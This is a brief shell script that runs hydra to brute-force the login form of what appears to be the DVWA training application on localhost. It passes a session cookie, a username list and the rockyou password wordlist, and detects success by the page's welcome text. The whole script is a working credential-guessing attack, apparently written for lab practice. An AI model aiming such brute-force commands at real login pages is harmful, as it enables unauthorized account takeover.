#!/bin/sh
PHPSESSID="otvfpg95r3p6qf24v9dsaru6s2"
SECURITY="high" # low, medium or high
USER_LST="./Brute_Force.users"
PASSWD_LST="/usr/share/wordlists/rockyou.txt"
hydra -s 9999 -L $USER_LST -P $PASSWD_LST -w 1 localhost http-get-form \
"/vulnerabilities/brute/\
:username=^USER^&password=^PASS^&Login=Login\
:H=Cookie\: PHPSESSID=$PHPSESSID; security=$SECURITY\
:S=Welcome to the password protected area"
# :F=Username and/or password incorrect."